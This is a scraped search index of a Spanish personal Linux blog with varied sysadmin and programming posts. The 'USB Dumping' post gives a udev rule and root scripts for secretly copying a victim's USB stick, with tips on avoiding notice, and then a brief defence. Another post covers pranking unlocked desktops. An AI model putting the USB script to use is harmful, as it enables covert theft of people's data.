politcs\" \"licencia de uso de Ubuntu One\"","tags":"admin","url":"https://karpoke.ignaciocano.com/2010/10/31/como-publicar-directorios-en-ubuntu-one-y-dropbox/","loc":"https://karpoke.ignaciocano.com/2010/10/31/como-publicar-directorios-en-ubuntu-one-y-dropbox/"},{"title":"The name of the game","text":"Cuando el Imperio Galáctico entró en decadencia, Hari Seldon, miembro de la corte del Emperador Cleón I, desarrolló la ciencia de la Psicohistoria. De esta manera, predijo que cuando el Imperio terminara de derrumbarse, comenzaría una edad oscura de 30.000 años, con la galaxia sumida en el caos. Esta edad terminaría con el ascenso de un Nuevo Imperio. Usando las leyes de esta nueva ciencia, Seldon inventó un plan para reducir el interregnum de 30.000 a sólo 1.000 años, plantando las semillas de una nueva civilización. Seldon, con la ayuda de Las Zenow, bibliotecario mayor de Trántor, encontró dos planetas donde crear civilizaciones adecuadas para convertirse en un Segundo Imperio Galáctico milenios después. Tras una larga búsqueda, Terminus fue elegido como el más apropiado. Seldon manipuló a la poderosa Comisión de Seguridad Pública para enviar una colonia bajo su control a Terminus. La colonia estaba formada por 100.000 científicos especialmente elegidos, de buena salud, con el propósito original de publicar la primera Enciclopedia Galáctica. Sin embargo, el verdadero motivo de Seldon era crear el núcleo de una civilización que luego sería conocida como Fundación. \" La Fundación \", Isaac Asimov Este servidor, de nombre Términus, es un viejo portátil venido a sobremesa. La batería ya hace tiempo que pasó a mejor vida , aunque tiempo antes ya había tenido problemas con la tarjeta gráfica. Comenzaron apareciendo patrones extraños que cambiaban de color según el color del fondo. En la captura se puede ver que con el fondo blanco se veían azules. La imagen anterior es una captura de pantalla, no una foto, por lo que parecía ser un problema de la tarjeta gráfica. Lo segundo que probé fue conectarlo a un monitor externo, y seguía haciéndo lo mismo. Sin embargo, al desconectarlo del monitor, sólo el cuadrante superior izquierdo de la pantalla quedó rellanado con esos patrones, el resto de la pantalla se veía bien. Era el mismo patrón, con el mismo número de \"rectángulos\", pero más pequeños y ocupando sólo el cuadrante superior izquierdo; supongo que tendría algo que ver con la diferencia de resolución de pantalla del monitor respecto a la pantalla del portátil. De todas formas, tras reiniciar, el patrón se volvió a repetir en toda la pantalla, y los rectángulos volvieron a su tamaño inicial. Poco tiempo después, también mostraba cosas raras mientras arrancaba el portátil. Los mensajes de inicio y el menú de GRUB mostraban caracteres extraños, como si los píxeles hubieran sido puestos al azar, pero sólo en los caracteres que no eran ASCII-127. Es decir, en los caracteres como las vocales acentuadas o los típicos caracteres que se emplean para encuadrar un texto en ASCII. Al final, también comenzó a hacerlo en los terminales de texto, Ctrl+Alt+F{1..6} , mostrando una interfaz de usuario caleidoscópica.","tags":"memo","url":"https://karpoke.ignaciocano.com/2010/10/28/the-name-of-the-game/","loc":"https://karpoke.ignaciocano.com/2010/10/28/the-name-of-the-game/"},{"title":"USB Dumping","text":"El USB Dumping consiste en copiar el contenido de un USB introducido en un ordenador, sin que la víctima se entere. En Ubuntu, podemos conseguir que se ejecute el script que llevará a cabo el robo de información, cuando se conecte un dispositivo USB. Para ello, deberemos crear alguna regla de udev . udev y sysfs udev se encarga de crear los nodos en /dev para los dispositivos presentes en el sistema. Para ello, se basa en la información prorcionada por sysfs y una serie de reglas proporcionadas por el usuario. sysfs devuelve información de los dispositivos conectados al sistema, y udev lo utiliza para crear los nodos /dev . Reglas Las reglas se guardan en ficheros de configuración dentro del directorio /etc/udev/rules.d . Los nombres de los ficheros pueden tener un número al comienzo, en función de la prioridad y de algunos privilegios que les queramos otorgar. En el archivo README que hay en ese directorio hay una pequeña explicación de esto. A nosotros nos basta con saber que, como no nos importa el orden, nuestro fichero de reglas no necesita llevar prefijo numérico. Podría llamarse, por ejemplo: /etc/udev/rules.d/usb-dumping.rules . Las reglas podrán ser aplicadas inmediatamente después de haber guardado el fichero, ya que no es necesario reiniciar el demonio. Para nuestro caso, la regla sería: bash KERNEL==\"sd[b-d]1\", ACTION==\"add\", RUN+=\"/home/karpoke/usb-dumping.sh %k\" donde KERNEL==\"sd[b-d]1\" , especifica que la regla se debe ejecutar cada vez que el kernel asigne un nombre como sdb1 , sdc1 ó sdd1 . Evitamos el /dev/sda porque es donde está montado el sistema. También hemos evitado interesarnos por otras particiones que pudiera haber en el disco: sdb2 , sdb5 , etc... ACTION==\"add\" , especifica que la regla se debe ejecutar cuando se conecte el dispositivo. Lo contrario sería remove . RUN+=\"...\" , especifica el script que hay que ejecutar cuando se cumplen las condiciones. %k , es el nombre que le asigna el kernel al dispositivo y se lo pasamos al script como parámetro. En el fichero /var/log/messages , podremos obtener información útil acerca de los dispositivos conectados y de si no encuentra nuestro script o no puede ejecutarlo, pero, ¡ojo!, no saldrá nada si nuestro script no hace lo que toca o si tiene algún error de sintaxis. Volcado dd El script , que se ejecuta como root , es importante que esté marcado como ejecutable y contenga el shebang en la primera línea, ya que udev no lo ejecutará en un terminal ni en una consola. Podría ser algo tan sencillo como: ```bash !/bin/sh devname=\" \\(1\" # p.ej: sdb1 dd if=/dev/\\) devname of=/tmp/$devname.dd & ``` Debemos utilizar el & para asegurarnos de que la ejecución del script continúa en segundo plano. La ventaja de usar dd es que no bloquea el dispositivo, por lo que si la víctima lo retira no pasará nada. Otra ventaja es que se podrían copiar archivos que la víctima haya eliminado de su USB . El principal inconveniente es que se creará un fichero del mismo tamaño que el USB entero, aunque éste estuviera vacío, con el tiempo que eso puede conllevar. [haciendo pruebas, me ha tardado 1 minuto y 15 segundos para un USB de 1 GByte] Para recuperar la información del archivo volcado, deberemos montarlo en un directorio: bash $ mkdir ~/usb_fs $ sudo mount -o loop,ro,noexec,nodev /tmp/sdb1.dd ~/usb_fs La opción noexec para el mount es importante, ya que no nos gustaría que ese USB estuviera infectado y programado para ejecutar algún tipo de script al montarse. cp En lugar de usar dd podríamos utilizar cp , con la ventaja de que sólo copia los ficheros y directorios existentes en el USB. En este caso, el inconveniente es que se bloquea el USB, y no dejará que el dispositivo se expulse de forma segura hasta que haya terminado la copia. Hay que tener en cuenta que no podemos utilizar cp directamente con /dev/sdb1 , sino que primero deberemos montar el dispositivo. ```bash !/bin/sh devname=\" \\(1\" # p.ej: sdb1 mkdir /mnt/\\) devname mount /dev/ \\(devname /mnt/\\) devname cp -fr /mnt/$devname /tmp & ``` Sin embargo, esto tiene otro problema, y es que al haber montado el dispositivo, Ubuntu no lo vuelve a montar y, por tanto, no se muestra al usuario. Podríamos abrir el directorio en un ventana de Gnome con algo como: bash export DISPLAY=:0.0 nautilus /mnt/$devname Por otro lado, si lo hacemos así, el directorio de montaje no se llamará como el nombre del volumen del USB, cosa que podría llamar la atención del usuario. Además, deberíamos asegurarnos de eliminar el directorio recién creado y desmontar el dispositivo cuando éste se extraiga. Esto lo podríamos hacer con otra regla en nuestro fichero de reglas para udev : bash KERNEL==\"sd?1\", ACTION==\"remove\", RUN+=\"/home/karpoke/usb-dumping-umount.sh '%k'\" y en este script para demontar la unidad tendríamos algo como: bash umount /dev/$devname rm -fr /mnt/$devname ¿Y si pudiéramos matar el proceso de copia del primer script desde este último script , con un pkill , por ejemplo? No sirve, ya que este script se ejecuta cuando el dispositivo ya ha sido desconectado, y en el caso de que utilicemos la opción con cp y el usuario no podrá sacar el USB de forma segura antes de que la copia haya terminado. Protección La única solución que se me ocurre para protegernos de una forma segura de este tipo de ataques es, o bien no utilizar nuestro USB en ningún otro ordenador, cosa harto improbable si lo que queremos con el USB es tener nuestros archivos independientemente del ordenador en el que estemos, o bien cifrar el contenido del USB, en todo o en parte. if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) { var align = \"center\", indent = \"0em\", linebreak = \"false\"; if (false) { align = (screen.width < 768) ? \"left\" : align; indent = (screen.width < 768) ? \"0em\" : indent; linebreak = (screen.width < 768) ? 'true' : linebreak; } var mathjaxscript = document.createElement('script'); mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#'; mathjaxscript.type = 'text/javascript'; mathjaxscript.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.3/latest.js?config=TeX-AMS-MML_HTMLorMML'; var configscript = document.createElement('script'); configscript.type = 'text/x-mathjax-config'; configscript[(window.opera ? \"innerHTML\" : \"text\")] = \"MathJax.Hub.Config({\" + \" config: ['MMLorHTML.js'],\" + \" TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'none' } },\" + \" jax: ['input/TeX','input/MathML','output/HTML-CSS'],\" + \" extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js'],\" + \" displayAlign: '\"+ align +\"',\" + \" displayIndent: '\"+ indent +\"',\" + \" showMathMenu: true,\" + \" messageStyle: 'normal',\" + \" tex2jax: { \" + \" inlineMath: [ ['\\\\\\\\(','\\\\\\\\)'] ], \" + \" displayMath: [ ['$$','$$'] ],\" + \" processEscapes: true,\" + \" preview: 'TeX',\" + \" }, \" + \" 'HTML-CSS': { \" + \" availableFonts: ['STIX', 'TeX'],\" + \" preferredFont: 'STIX',\" + \" styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} },\" + \" linebreaks: { automatic: \"+ linebreak +\", width: '90% container' },\" + \" }, \" + \"}); \" + \"if ('default' !== 'default') {\" + \"MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"}\"; (document.body || document.getElementsByTagName('head')[0]).appendChild(configscript); (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript); }","tags":"hack","url":"https://karpoke.ignaciocano.com/2010/10/27/usb-dumping/","loc":"https://karpoke.ignaciocano.com/2010/10/27/usb-dumping/"},{"title":"y2k38","text":"```bash $ grep INT_MAX /usr/include/limits.h define INT_MAX 2147483647 $ date -u -d @2147483647 mar ene 19 03:14:07 UTC 2038 $ date -d @2147483647 mar ene 19 04:14:07 CET 2038 $ date -u -d @2147483648 date: fecha ``@2147483648'' inválida ```","tags":"memo","url":"https://karpoke.ignaciocano.com/2010/10/27/y2k38/","loc":"https://karpoke.ignaciocano.com/2010/10/27/y2k38/"},{"title":"Recuperando archivos del USB","text":"Tengo la mala costumbre de borrar archivos utilizando la combinación shift+del , para borrarlos directamente sin pasar por la papelera. Llegará el momento en que borre algo que no debería o algo que necesitaré más tarde. Si esto sucediese, lo mejor podría ser: Desmontar el USB para evitar males mayores bash $ sudo umount /media/miusb # 'miusb' es el nombre del volumen del USB Hacer una copia del USB con dd {ang=\"bash\"} $ dd if=/dev/sdb1 of=/tmp/miusb.dd # sdb1 es la unidad donde se monta el USB Podemos listar los archivos borrados con ils bash $ ils -r /tmp/miusb.dd bash class|host|device|start_time ils|anacreonte||1288172460 st_ino|st_alloc|st_uid|st_gid|st_mtime|st_atime|st_ctime|st_crtime|st_mode|st_nlink|st_size 8|f|0|0|1263329350|1265842800|0|1263329350|777|0|33076 12|f|0|0|1265738134|1288130400|0|1265738134|777|0|31609 14|f|0|0|1263325690|1288130400|0|1263325690|777|0|28946 16|f|0|0|1263326438|1288130400|0|1263326438|777|0|2305751 19|f|0|0|1263327386|1288130400|0|1263327386|777|0|91028 Creamos un directorio para tener todos los archivos que se puedan recuperar bash $ mkdir /tmp/miusb_tmp Recuperamos los archivos con icat bash $ for i in $(ils -r /tmp/miusb.dd | awk '{print $1}' FS=\"|\" | sed 1,3d); do icat -r /tmp/miusb.dd $i > /tmp/miusb_tmp/$i echo $i done Comprobamos el tipo de archivos recuperados bash $ file /tmp/miusb_tmp/* bash 8: OpenDocument Text 12: PDF document, version 1.2 14: PDF document, version 1.3 16: PDF document, version 1.4 19: PDF document, version 1.2 ils y icat vienen incluidos en el paquete sleuthkit , que se encuentra en los repositorios. También existe autopsy , que es una interfaz web para sleuthkit .","tags":"admin","url":"https://karpoke.ignaciocano.com/2010/10/27/recuperando-archivos-del-usb/","loc":"https://karpoke.ignaciocano.com/2010/10/27/recuperando-archivos-del-usb/"},{"title":"Sa Nostra y SSL","text":"Leyendo la comparativa de SbD sobre el uso de SSL por parte de los bancos online, estos son los resultados de Sa Nostra: URL: https://linea.sanostra.es Verificación SSLv2 Comando: bash $ openssl s_client -ssl2 -connect linea.sanostra.es:443 Bien: no da soporte Tipo de certificado (Normal/EV) Esto lo podemos comprobar a través del navegador. Mal: Tiene un certificado SSL sin Validación Extendida. Longitud de la clave RSA del certificado Comando: bash $ openssl s_client -connect linea.sanostra.es:443 Mal: La clave es de 1024 bits. Soporte de algoritmos débiles Comando: bash $ openssl s_client -cipher LOW:EXP -connect linea.sanostra.es:443 Bien: No admite algoritmos 'débiles', cuya longitud de clave sea de 56 ó 64 bits. Puntuación final: Aprobado \"SbD\"","tags":"admin","url":"https://karpoke.ignaciocano.com/2010/10/25/sa-nostra-y-ssl/","loc":"https://karpoke.ignaciocano.com/2010/10/25/sa-nostra-y-ssl/"},{"title":"Fuck yeah","text":"keyboard cult","tags":"memo","url":"https://karpoke.ignaciocano.com/2010/10/23/fuck-yeah/","loc":"https://karpoke.ignaciocano.com/2010/10/23/fuck-yeah/"},{"title":"Señoras que se ponen un nombre falso en Facebook pero usan su dirección de correo personal","text":"Facebook permite buscar usuarios por su dirección de correo. De hecho, es así como encuentra amigos en GMail o en el Messenger. Si usamos GMail, podemos seguir usando nuestro correo personal pero evitando que nos puedan localizar usando éste. Podemos añadir un sufijo a nuestro nick en la dirección de correo, precedido por el signo + , y los correos enviados a esa dirección nos seguirán llegando a nuestra cuenta. Por ejemplo, los correos enviados a spamme+please@gmail.com , seguirán llegando a la cuenta spamme@gmail.com . Así mismo, también podemos intercalar puntos \" . \" entre los caracteres de nuestro nombre y también nos llegarán a nosotros. Por ejemplo, los correos enviados a spam.me@gmail.com o sp.am.me@gmail.com , también llegarán a spamme@gmail.com .","tags":"hack","url":"https://karpoke.ignaciocano.com/2010/10/23/senoras-que-se-ponen-un-nombre-falso-en-facebook-pero-usan-su-direccion-de-correo-personal/","loc":"https://karpoke.ignaciocano.com/2010/10/23/senoras-que-se-ponen-un-nombre-falso-en-facebook-pero-usan-su-direccion-de-correo-personal/"},{"title":"La guardiana de la puerta","text":"¿A veces no os gustaría saber si el que se mete en vuestra casa no es el maestro de las llaves? En ubuntu , los scripts que estén en el directorio /etc/profile.d se ejecutan cada vez que un usuario inicia la sesión. Si nuestro servidor sólo lo usamos nosotros, y si no también, podríamos enviarnos un correo cada vez que un usuario se conecta . Así, al menos, podríamos saber si alguien ha entrado con nuestro usuario.","tags":"admin","url":"https://karpoke.ignaciocano.com/2010/10/22/la-guardiana-de-la-puerta/","loc":"https://karpoke.ignaciocano.com/2010/10/22/la-guardiana-de-la-puerta/"},{"title":"De aquí al 2038","text":"Como bien dice el agente Smith, es cuestión de contrastar un poco. Octubres con 5 viernes, 5 sábados y 5 domingos, de aquí al 2038 , si es que llegamos: bash $ for ((i=2011; i < 2039; i++)); do cal 10 $i; done | grep -B2 -A4 \" 1 2 3\" bash Octubre 2021 lu ma mi ju vi sá do 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 -- Octubre 2027 lu ma mi ju vi sá do 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 -- Octubre 2032 lu ma mi ju vi sá do 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 -- Octubre 2038 lu ma mi ju vi sá do 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31","tags":"memo","url":"https://karpoke.ignaciocano.com/2010/10/07/de-aqui-al-2038/","loc":"https://karpoke.ignaciocano.com/2010/10/07/de-aqui-al-2038/"},{"title":"Mostrando las cabeceras HTTP","text":"Leyendo el artículo de análisis de cabeceras de SbD y, en particular, lo relacionado con las cabeceras no estándar, es decir, las que comienzan por X- , se me ha ocurrido que estaría bien ver qué debe haber por el mundo: Suponiendo que el archivo sites.txt contiene un listado de los sitios que queremos comprobar: ```bash $ for url in $(cat sites.txt); do echo $url curl -sI $url | grep \"&#94;X-\" done > headers.txt ``` Es cierto que se podría haber realizado de otras formas: bash $ HEAD barrapunto.com bash $ nc barrapunto.com 80 GET / HTTP/1.1 bash $ telnet barrapunto.com 80 GET / HTTP/1.1 Host:barrapunto.com bash $ wget -qS barrapunto.com bash $ w3m -dump_head barrapunto.com bash $ lynx -head -dump \"http://barrapunto.com\"","tags":"admin","url":"https://karpoke.ignaciocano.com/2010/10/07/mostrando-las-cabeceras-http/","loc":"https://karpoke.ignaciocano.com/2010/10/07/mostrando-las-cabeceras-http/"},{"title":"De pantallas bloqueadas, capturas de pantalla y David Hasselhoff","text":"El ataque David Hasselhof es una de las técnicas de guerrilla de oficina con la mejor relación coste/humillación &#94; [cita\\ requerida] &#94;, basta encontrarse una sesión de usuario abierta (y no protegida contra este \"ataque\") y, ¡zas!, en toda la boca. No sé si un aviso disuasorio como medida de prevención contra este tipo de ataque será efectivo, pero me ha hecho preguntarme cómo podríamos incluirlo en Gnome. Capturas de pantalla Curiosamente, lo primero que he encontrado sobre la ventana de desbloquear la pantalla es que no se puede realizar una captura de pantalla de la misma pulsando la tecla Impr Pant ; pruébalo! Esto no significa que no se pueda realizar, y no hablo de recurrir a métodos como un escritorio remoto o una máquina virtual, sino desde la consola: bash $ sleep 5; import -window root screenshot.png Tras escribir estos comandos en una consola, tendremos 5 segundos para que se realice una captura de pantalla, con el comando import , y que se guardará como screenshot.png . Para que la captura se realice de la pantalla de desbloqueo, primero debemos bloquear la sesión. Vamos al menú de sesión, bloquear la pantalla y una vez bloqueada, movemos el ratón o pulsamos alguna tecla para que aparezca la ventana de desbloqueo. También podemos bloquear la sesión pulsando la combinación de teclas Ctrl+Alt+L . Ya puestos, si queremos realizar una captura de pantalla en un ordenador remoto, estando conectados a través de ssh , debemos, además de inicializar la variable de entorno DISPLAY , cambiar previamente al terminal gráfico, /dev/tty7 , con el comando chvt , más o menos lo que haríamos con la combinación de teclas Ctrl+Alt+F7 si fuese en local: bash $ chvt 7; sleep 5; DISPLAY=:0.0 import -window root screenshot.png Ventana de desbloqueo Para añadir el mensaje disuasorio, debemos fijarnos en el fichero /usr/share/gnome-screensaver/lock-dialog-default.ui . En ese fichero se define el contenido de la ventana de desbloqueo, es decir, cosas como: auth-realname-label , el nombre real del usuario, auth-username-label , el nombre de usuario y el del equpo, auth-status-label , el mensaje de estado El mensaje de estado se utiliza, cuando es necesario, para mostrar mensajes como que se está comprobando la contraseña o que ésta es incorrecta. Utilizaremos este campo para mostrar inicialmente el aviso disuasorio. Para esto, modificamos la propiedad label del objeto con el id=auth-status-label : ```xml por xml AVISO: Terminal protegida contra ataques 'Hasselhoff'. En caso de ser detectado, se tomarán represalias. El ataque David Hasselhoff Receta para Ubuntu: Descargar una imagen de David Hasselhoff como esta Abrirla con el visor de imágenes de Gnome (EOG, Eye of Gnome ) Menú Imagen > Establecer como fondo de escritorio, o Ctrl+F8 También lo podríamos hacer de forma remota, pero aquí tiene menos gracia, ya que, o bien tenemos acceso a la cuenta de usuario o bien tenemos privilegios de administrador. Aún así, es difícil resistirse. Descargamos la imagen: wget http://www.una-web.com/la/imagen/de/david.jpg Ponemos la imagen de fondo: gconftool-2 -t str --set /desktop/gnome/background/picture_filename /ruta/aboluta/a/la/imagen/david.jpg más sobre el ataque Hasselhoff en el lado del mal","tags":"hack","url":"https://karpoke.ignaciocano.com/2010/10/06/de-pantallas-bloqueadas-capturas-de-pantalla-y-david-hasselhoff/","loc":"https://karpoke.ignaciocano.com/2010/10/06/de-pantallas-bloqueadas-capturas-de-pantalla-y-david-hasselhoff/"},{"title":"Actualización recursiva de un diccionario en Python","text":"Cuando actualizamos un diccionario con otro en Pyhton, el método update copia las entradas del diccionario fuente en el diccionario destino, sobreescribiendo las de éste si la entrada existe en ambos diccionarios. En particular, si un diccionario contiene una entrada que es a su vez otro diccionario, no se realiza una actualización sobre ésta, por lo que se pierden los valores que no estuvieran en el diccionario fuente. Ilustremos este comportamiento con un ejemplo: ```python d1 = {'a': 1, 'b': {'c': 3, 'd': 4}} d2 = {'a': 11, 'b': {'c': 33}} d1.update(d2) print d1 {'a': 11, 'b': {'c': 33}} ``` d1 contiene a su vez un diccionario, d1['b'] , y al realizar la actualización hemos perdido el valor d1['b']['d'] . Nos podría interesar que, en lugar de sobreescribir cada entrada del diccionario destino, compruebe primero si es un diccionario y realice una actualización sobre éste. ```python def update_dict_r(dst, src): ... \"\"\" updates a diccionary recursively, performing an updating on each ... dictionary inside ... \"\"\" ... for k, v in src.items(): ... if k in dst and isinstance(v, dict): ... update_dict_r(dst[k], src[k]) ... else: ... dst[k] = src[k] d1 = {'a': 1, 'b': {'c': 3, 'd': 4}} d2 = {'a': 11, 'b': {'c': 33}} update_dict_r(d1, d2) print d1 {'a': 11, 'b': {'c': 33, 'd': 4}} ``` Ahora ya no no se ha sobreescrito el diccionario d1['b'] , si no que se ha realizado una actualización con el diccionario d2['b'] , con lo que no hemos perdido el valor de d1['b']['d'] . Esto podemos utilizarlo, por ejemplo, en Django, para definir un diccionario con datos por defecto, que sea sobreescrito con aquellos valores que queramos personalizar. En el archivo que mapea las direcciones, urls.py , tendremos algo como: python info_dict = { 'template_name': 'mymodel_paginated_list.html', 'extra_context':{'paginate_by':2}, } urlpatterns = patterns('', url(r'&#94;$', mymodel_list, info_dict, name=\"myapp_mymodel_list\"), } Aquí le estamos pasando a la vista mymodel_list (que previsiblemente mostrará una lista de los elementos de mymodel ), una variable que queremos utilizar en la plantilla, paginate_by . Para la realizar la pagínación de una lista de elementos podemos utilizar la aplicación django-pagination , con lo que la gestión de la paginación y la navegación se vuelve increíblemente sencilla, necesitando únicamente añadir un par de etiquetas a la plantilla. Una de estas etiquetas es {% autopaginate object_list paginate_by %} , que, opcionalmente, admite como parámetro el número de elementos por página. De ahí que pasemos la variable paginate_by en el extra_context y no como como parámetro de la vista. Ahora, si queremos que pasar este valor sea opcional, necesitamos especificar un valor por defecto, antes de renderizar la plantilla. En la vista, dentro del fichero views.py , tendremos algo como: python from django.views.generic.list_detail import object_list def mymodel_list(request, **info_dict): \"\"\" Returns a paginated list of the model elements \"\"\" default_dict = { 'queryset': Mymodel.objects.all(), 'template_name': 'myapp_list.html', 'extra_context': { 'paginate_by': settings.PAGINATE_BY, 'other': 'other vars', } } default_dict.update(info_dict) return object_list(request, **default_dict) De esta forma, perdemos el valor de others , dentro de extra_context . Si además este valor se utiliza, por ejemplo, en un tag , obtendremos una bonita excepción Caught KeyError while rendering: 'other' . Una solución sería utilizar la función que hemos definido antes para actualizar el diccionario recursivamente, y en lugar de poner: python default_dict.update(info_dict) pondremos: python update_dict_r(default_dict, info_dict)","tags":"dev","url":"https://karpoke.ignaciocano.com/2010/09/28/actualizacion-recursiva-de-un-diccionario-en-python/","loc":"https://karpoke.ignaciocano.com/2010/09/28/actualizacion-recursiva-de-un-diccionario-en-python/"},{"title":"Memento en Bash","text":"No me acuerdo de olvidarte. Si lo primero que haces nada más iniciar una sesión es abrir el terminal. Varias ventanas, varias pestañas. screen , terminator o byobu . Es posible que, alguna vez, se te haya pasado por la cabeza que sería interesante guardar una nota sobre algo que estamos haciendo, algo que quisiéramos recordar más tarde, algo que quisiéramos no olvidar, algo que está relacionado con el directorio en el que estamos. Si, por ejemplo, tenemos un directorio con imágenes reducidas a un tamaño concreto, y queremos que, cuando haya pasado un tiempo y volvamos a este directorio, podamos recordar dicho tamaño de forma rápida y directa, de un vistazo, sin tener que (volver a) investigar cual era ese tamaño. Si estamos editando un fichero, podemos incluir la nota en un comentario dentro del fichero, pero es posible que no nos acordemos de dicha nota hasta que vayamos a editar ese fichero nuevamente, quizá por otro motivo. Si quisiéramos recordar muchas cosas, tenerlas en un único sitio no es lo más cómodo, ya que la lista en seguida crece. Si tenemos que enviar un correo electrónico más tarde, el directorio de usuario es un lugar frecuentemente transitado. Si quieres recordar el comando para buscar documentos repetidos en el directorio de descargas. Sería interesante que, nada más llegar a ese directorio, se mostrasen las notas que habíamos dejado ahí previamente. Como si tuviéramos post-it's escritos por toda la casa. Podemos conseguir esto añadiendo un alias para el comando cd que, además de cambiar de directorio, busque si hay notas y las muestre. Los alias se definen en el fichero ~/.bash_aliases : bash alias cd='source /home/user/scripts/memento.sh' El código del script memento.sh que nos permite hacer esto es: bash MSGFILE=\".msg\" \\cd \"$@\" if [ -r \"$MSGFILE\" ]; then awk \"\\$0!~/&#94;#/{ print '>>>',\\$0 }\" $MSGFILE fi Para dejar una nota en un directorio: bash $ echo \"Lorem ipsus dolor sit amet\" >> .msg Actualizado el 5 de agosto de 2011 Ahora ya podemos utilizar el propio script para ir añadiendo notas. También he incluido la opción de que nos informe del número de elementos ocultos que hay en el directorio. El script debe estar en el PATH del sistema, o podemos especificar la ruta hasta él, y permisos de ejecución. bash $ memento.sh \"Lorem ipsum dolor sit amet\" Cuando visitemos dicho directorio: ```bash $ cd 19 hidden files and directories found. Lorem ipsum dolor sit amet ``` Como colofón, comentar que si queremos ver cuáles son esos ficheros y directorios ocultos podemos ejecutar: bash $ ls -d .* | sed 1,2d Mejor aún, podemos crear un alias: bash $ alias vh='ls -d .* | sed 1,2d'","tags":"dev","url":"https://karpoke.ignaciocano.com/2010/09/26/memento-en-bash/","loc":"https://karpoke.ignaciocano.com/2010/09/26/memento-en-bash/"},{"title":"La batería del portátil","text":"Algunos falsos mitos de las baterías del portátil : Es necesario que se agote la batería para ponerla a cargar, no se debe dejar el portátil siempre enchufado a la corriente, ni se debe suspender conectado a la corriente. También existen técnicas para alargar la vida de la batería : enchufa el portátil (y enciéndelo, si quieres) hasta que la batería este cargada y déjalo cargando 2 horas más, desenchufa el portátil y espera a que se gaste la batería e hiberne enchufa el portátil sin encenderlo hasta que se cargue la batería realizar estas operaciones cada 2 ó 3 meses En principio, las baterías de los portátiles ya incorporan un mecanismo que corta la corriente cuando éstas están totalmente cargadas, evitando así la fatiga por la carga continua. De todas formas, he pensado que sería buena idea obtener un aviso cuando la batería ha terminado de cargarse, por si aún así queremos desenchufar el portátil de la corriente. Dentro del directorio /proc/acpi/battery/BAT0 hay unos ficheros que contienen información del estado de la batería: bash $ cat /proc/acpi/battery/BAT0/state present: yes capacity state: ok charging state: charged present rate: unknown remaining capacity: 1065 mAh present voltage: 12462 mV bash $ cat /proc/acpi/battery/BAT0/info present: yes design capacity: 4400 mAh last full capacity: 1130 mAh battery technology: rechargeable design voltage: 12414 mV design capacity warning: 113 mAh design capacity low: 56 mAh capacity granularity 1: 35 mAh capacity granularity 2: 8 mAh model number: M50EA0 serial number: 00001 battery type: LiOn OEM info: OEM Podemos utilizar esta información para escribir un pequeño script que compruebe si la batería está cargando o si ya ha terminado: ```bash \\( if [[ -n \"\\) (awk /charged/'{print $3}' /proc/acpi/battery/BAT0/state)\" ]]; then export DISPLAY=:0.0 notify-send -u critical --icon=gtk-dialog-error \"Unplug the AC power\" fi ``` Luego podemos meter esto en el script check-battery-status.sh y añadirlo al cron para que lo ejecute regularmente, por ejemplo, cada 5 minutos: bash $ */5 * * * * /home/user/check-battery-status.sh En lugar de examinar el fichero /proc/acpi/battery/BAT0/state directamente, podemos utilizar algunos comandos que nos muestran esta información de diferentes formas, ya sea mostrando información relativa a un aspecto concreto, o ampliando dicha información. Por ejemplo, el comando acpitool : ```bash $ acpitool -h Usage: acpitool [option] . . . Shows ACPI information from the /proc/acpi filesystem, like battery status, temperature, or ac power. Can also suspend your machine (if supported). -a, --ac_adapter AC adapter information -A, --Asus show supported Asus ACPI extensions (LCD brightness level, video out routing DSTD/acpi4asus info) -b battery status, available batteries only -B, --battery battery status, all info on all battery entries -c, --cpu CPU information (type, speed, cache size, frequency scaling, c-states, . . .) -e show just about everything -f, --fan show fan status -F x force fan on (x=1) or switch back to auto mode (x=0). (Toshiba only) -h, --help show this help screen -j eject ultrabay device (Thinkpad only) -l x set LCD brightness level to x, where x is 0..7 (Toshiba and Thinkpad only) -m x switch the mail led on (x=1) or off (x=0) (Asus only) -n x switch the wireless led on (x=1) or off (x=0). (Asus only) -o x set LCD on (x=1) or off (x=0). (Asus only) -s, --suspend suspend to memory (sleep state S3), if supported -S suspend to disk (sleep state S4), if supported -t, --thermal thermal information, including trip_points -T, --Toshiba show supported Toshiba ACPI extensions (LCD brightness level, video out routing, fan status) -v be more verbose (more detailed error messages, only usefull combined with other options) -V, --version show application version number and release date -w, --wakeup show wakeup capable devices -W x enable/disable wakeup capable device x. The x can be seen when invoking -w first. -z x set Asus LCD brightness level to x, where x is 0..15 (Asus only). If invoked without options, acpitool displays information about available batteries, AC adapter and thermal information. For more info, type man acpitool at the prompt. AcpiTool v0.5.1, released 13-Aug-2009 Homepage: http://freeunix.dyndns.org:8000/site2/acpitool.shtml ``` Con el argumento -B nos muestra el porcentaje de capacidad perdida de la batería. La mía ya está agonizando: bash $ acpitool -B Battery #1 : present 